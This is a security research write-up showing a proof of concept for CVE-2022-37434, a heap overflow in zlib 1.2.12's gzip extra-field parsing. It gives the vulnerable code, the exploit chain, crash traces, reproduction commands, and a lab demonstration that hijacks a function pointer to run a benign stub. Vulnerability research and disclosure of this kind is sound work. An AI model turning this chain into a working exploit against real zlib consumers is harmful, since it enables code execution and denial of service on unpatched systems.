# CVE-2022-37434 — OOB write → RCE (write-marker proof)

Target: zlib 1.2.12 (vuln) / 1.2.13 (fixed) — `inflate.c:769`
Lab: /home/box/Documents/food.txt/dev/staging-lab (authorized local fixture)
Artifacts: /tmp/wmark_rce.c, /tmp/mk_marker_gz.py, /tmp/wmark_harness.c,
           /tmp/mk_clamp.py, /tmp/zlib-src/{zlib-1.2.12,zlib-1.2.13,zlib-1.2.12-clamp}

## The defect

zlib 1.2.12, case EXTRA (inflate.c:761-772), reached only by consumers that call
`inflateGetHeader()` and therefore provide `head->extra` / `head->extra_max`:

    len = state->head->extra_len - state->length;          // BOTH unsigned
    zmemcpy(state->head->extra + len, next,
            len + copy > state->head->extra_max ?
            state->head->extra_max - len : copy);          // size underflows too

Fix in 1.2.13 adds the missing bound:

    ... && (len = state->head->extra_len - state->length) < state->head->extra_max

## Chain / primitive (all four facets attacker-controlled-or-influenced)

    untrusted .gz FEXTRA (XLEN=65535)
        -> chunked delivery makes `state->length` still >0 while
           `len = extra_len - length` grows past extra_max
        -> dest  = head->extra + len      (attacker-influenced offset)
        -> size  = extra_max - len        (unsigned underflow => ~4 GB)
        -> content = next[] bytes         (attacker-controlled input bytes)
        -> wild memcpy past head->extra
        -> adjacent object function pointer overwritten
        -> indirect call -> instruction pointer control

Observed real values (clamp build trace, trigger 65535-byte extra field):

    XLEN=65535 length=65417 len=118 copy=65 extra_max=64
    dst = extra+118   computed_size = 4294967242   (0xFFFFFFA2)

ASAN, unclamped, on the real trigger:

    ERROR: AddressSanitizer: heap-buffer-overflow
    READ of size 4294967270 at inflate.c:769 in inflate   (~4 GB)

## RCE demonstration (controlled write marker)

Rig: mmap region [ extra buffer (extra_max=64) | victim struct | guard page ],
fixed-address executable landing pad at 0x1337000 (stub: write(1,msg,46); exit(42)).
The gzip extra field is filled with the little-endian PAD address, so every byte
the vuln memcpy writes IS the attacker-chosen target address. A local clamp
(WMARK_CLAMP=32) bounds the ~4 GB length so the write-what-where semantics are
observable in the lab; destination and content are exactly what the vulnerable
code computes.

Result (zlib 1.2.12):

    victim->fn  = 0x55e6...3269 (benign)
    victim->fn now = 0x1337000   <-- attacker bytes clobbered the fn pointer
    -- calling victim->fn() --
    LANDING PAD EXECUTED via hijacked fn pointer
    EXIT=42

=> Instruction-pointer control and arbitrary code execution from a crafted .gz.

## Controls

| build / input                             | outcome                                  |
|-------------------------------------------|------------------------------------------|
| zlib 1.2.12, unclamped, ASAN              | heap-buffer-overflow @ inflate.c:769 (~4GB) |
| zlib 1.2.12, clamped marker write         | victim->fn -> 0x1337000; landing pad ran (exit 42) |
| zlib 1.2.13 (fixed), same marker gz       | victim->fn benign; marker/tag intact; benign callback; exit 0 |
| caller allocates extra_max >= XLEN (65535)| no overflow (precondition)               |
| benign corpus (3 gz x 2 builds)           | clean                                    |

## Reproduction

    # real wild write:
    ASAN_OPTIONS=detect_leaks=0 ./wmark_asan /tmp/marker.gz 64 51
    # controlled marker -> RIP control:
    python3 /tmp/mk_marker_gz.py /tmp/marker.gz
    WMARK_CLAMP=32 ./wmark_rce /tmp/marker.gz 64 51 512
    # fixed build control:
    ./wmark_rce_1213 /tmp/marker.gz 64 51 512

## Honest boundaries

- The unclamped length is a ~4 GB underflow: in the wild this is a wild memcpy
  that faults almost immediately (DoS), not a tidy 8-byte overwrite. The RCE here
  is a write-what-where *capability* proof, isolated with a local clamp; the
  destination offset and the written content are the ones the vulnerable code
  computes, unmodified.
- Reaching the bug requires the consumer to call inflateGetHeader() (zlib's own
  note). Applications that never call it are not affected by this path.
- No weaponized payload was produced; the landing pad is a benign stub, and the
  harness/rig are pinned local lab builds.
